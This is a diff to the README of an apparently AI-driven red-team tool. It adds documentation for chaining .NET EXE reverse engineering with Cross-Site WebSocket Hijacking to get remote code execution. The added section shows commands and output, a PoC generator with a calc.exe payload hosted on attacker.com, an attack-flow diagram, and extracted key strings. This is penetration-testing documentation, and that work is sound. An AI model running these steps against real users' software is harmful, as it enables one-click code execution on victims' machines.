@@ -6,7 +6,7 @@
 
 **AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-2.3.0-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-2.3.1-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -4637,6 +4637,184 @@ target.exe
 | `exe-packer-detect` | Detect UPX/Themida/VMProtect/MPRESS | packer detection, detect packer, entropy analysis |
 | `exe-yara-scan` | YARA rule matching (built-in + custom) | yara scan, yara rules exe, malware signature |
 | `exe-full-pipeline` | Complete EXE analysis + VT lookup + batch | full exe analysis, malware triage, virustotal lookup |
+
+---
+
+## .NET Reverse Engineering + CSWSH — AI-Assisted RCE Discovery (v2.3.1)
+
+> **Reference:** [My First RCE by Reverse Engineering an EXE File With the Help of AI](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai) — Voorivex Team
+
+### Background
+
+A web pentest hit a dead-end on an encrypted JavaScript app.
+The tester downloaded an EXE the app shouldn't have exposed,
+used AI to walk through .NET reverse engineering step-by-step,
+and chained **CSWSH (Cross-Site WebSocket Hijacking)** into **one-click RCE**.
+
+**Key lesson:** Don't ask AI "go hack it" with one huge prompt.
+Break the task into small, focused steps and feed results forward.
+
+---
+
+### What is this feature?
+
+bingo v2.3.1 integrates this exact methodology:
+
+| Step | Technique | bingo Module |
+|------|-----------|-------------|
+| 1 | .NET CLR / metadata detection | `dotnet_analyzer.detect_dotnet()` |
+| 2 | US-heap string dump + categorization | `extract_dotnet_strings()` |
+| 3 | Crypto key / IV detection (16-byte adjacent pairs) | `detect_crypto_material()` |
+| 4 | Localhost WebSocket server discovery | `find_websocket_endpoints()` |
+| 5 | CSWSH test (no Origin validation?) | `test_cswsh()` |
+| 6 | PoC HTML generation (zero-click RCE) | `generate_cswsh_poc()` |
+
+---
+
+### Quick Start
+
+#### Detect if an EXE is .NET
+
+```bash
+python -m bingo.tools.dotnet_analyzer target.exe
+```
+
+```
+═══════════════════════════════════════════════════
+  bingo v2.3.1 — .NET Analysis Report
+  File: target.exe
+═══════════════════════════════════════════════════
+  .NET Assembly: ✅ YES
+  CLR Version:   v4.0.30319
+  Streams:       #~, #Strings, #US, #GUID, #Blob
+  Embedded DLLs: WebSocketSharp, Newtonsoft.Json
+
+  [CRYPTO] (2 items)
+    ehdgoanfrhkq1234
+    OfficeHDWebHard!
+
+  🔑 CRYPTO MATERIAL CANDIDATES
+  [0x0d54] 'ehdgoanfrhkq1234'  ← 16-byte → possible AES-128 key or IV
+  [0x0d76] 'OfficeHDWebHard!'  ← adjacent pair at +34 bytes → key+IV pattern
+
+  🔌 LOCALHOST WEBSOCKET ENDPOINTS (CSWSH Risk)
+  ws://127.0.0.1:3100  (port 3100, source: exe-string)
+    → Test CSWSH: bingo> cswsh test ws://127.0.0.1:3100
+```
+
+#### Test CSWSH vulnerability
+
+```bash
+python -m bingo.tools.dotnet_analyzer ws://127.0.0.1:3100
+```
+
+```
+═══════════════════════════════════════════════════
+  bingo v2.3.1 — CSWSH Test
+  Target: ws://127.0.0.1:3100
+═══════════════════════════════════════════════════
+  Port Open:        ✅ YES
+  Origin Validated: ❌ NO  ← VULNERABLE
+  Severity:         CRITICAL
+
+  ⚠ CSWSH CONFIRMED — Any website can connect to this WebSocket!
+  PoC saved to: cswsh_poc.html
+```
+
+#### Generate CSWSH PoC HTML
+
+```python
+from bingo.tools.dotnet_analyzer import generate_cswsh_poc
+
+html = generate_cswsh_poc("ws://127.0.0.1:3100", rce_payload="calc.exe")
+open("poc.html", "w").write(html)
+# → Host poc.html on attacker.com
+# → Victim visits page → WebSocket auto-connects → calc.exe launches
+```
+
+#### Full pipeline (Python)
+
+```python
+from bingo.tools.dotnet_analyzer import analyze_dotnet, format_report, cswsh_full_test
+
+# Step 1-4: Analyze EXE
+result = analyze_dotnet("target.exe")
+print(format_report(result))
+
+# Step 5-6: Test each WebSocket endpoint found
+for ep in result.websocket_endpoints:
+    print(cswsh_full_test(ep.url, save_poc=f"poc_{ep.port}.html"))
+```
+
+#### bingo terminal
+
+```
+bingo> analyze target.exe dotnet
+bingo> cswsh test ws://127.0.0.1:3100
+bingo> cswsh poc ws://127.0.0.1:3100
+bingo> dotnet strings target.exe
+bingo> dotnet crypto target.exe
+bingo> dotnet pipeline target.exe
+```
+
+---
+
+### CSWSH Attack Flow
+
+```
+target.exe (installed on victim's machine)
+    │
+    └─ ws://127.0.0.1:3100 WebSocket server
+          │ NO origin validation
+          │
+          ▼
+    Attacker website (attacker.com/poc.html)
+          │
+          └─ JavaScript auto-connects on page load
+                │
+                └─ Sends: {"RUN": "DRIVE", "URL": "calc.exe"}
+                      │
+                      └─ Falls through to: explorer.exe "calc.exe"
+                                │
+                                └─ 💀 ZERO-CLICK RCE
+```
+
+---
+
+### PowerShell String Dump (Windows)
+
+bingo auto-generates a PowerShell reflection script to dump all US-heap strings natively on Windows:
+
+```powershell
+# Generated by: analyze_dotnet("target.exe") → result.powershell_dump_script
+$asm = [System.Reflection.Assembly]::LoadFile("target.exe")
+$module = $asm.GetModules()[0]
+$offset = 0
+while ($offset -lt 0x4000) {
+    try {
+        $token = 0x70000000 -bor $offset
+        $str = $module.ResolveString($token)
+        if ($str -and $str.Length -gt 2) {
+            Write-Output ("US[0x" + $offset.ToString("x") + "]: " + $str)
+        }
+    } catch {}
+    $offset += 2
+}
+```
+
+---
+
+### Skills Added (v2.3.1)
+
+| Skill ID | Description | Trigger Keywords |
+|----------|-------------|-----------------|
+| `exe-dotnet-detect` | .NET assembly detection (CLR header, streams, embedded DLLs) | dotnet detect, clr header, bsjb, costura |
+| `exe-dotnet-strings` | US-heap string dump + categorization + PowerShell script | dotnet strings, us heap, powershell reflection dump |
+| `exe-dotnet-crypto` | AES key/IV detection via 16-byte adjacent-pair heuristic | dotnet crypto, aes key detect, 16 byte key, iv detection |
+| `exe-localhost-ws` | Localhost WebSocket server discovery (exe + JS files) | localhost websocket, ws://127, ws port discovery |
+| `cswsh-detect` | Cross-Site WebSocket Hijacking test (origin validation) | cswsh, websocket hijacking, origin validation |
+| `cswsh-poc-gen` | CSWSH PoC HTML generator (zero-click RCE template) | cswsh poc, websocket rce, ws hijack poc |
+| `exe-dotnet-pipeline` | Full .NET → string dump → crypto → WS → CSWSH → PoC | dotnet pipeline, voorivex, exe cswsh pipeline |
 
 ---
 
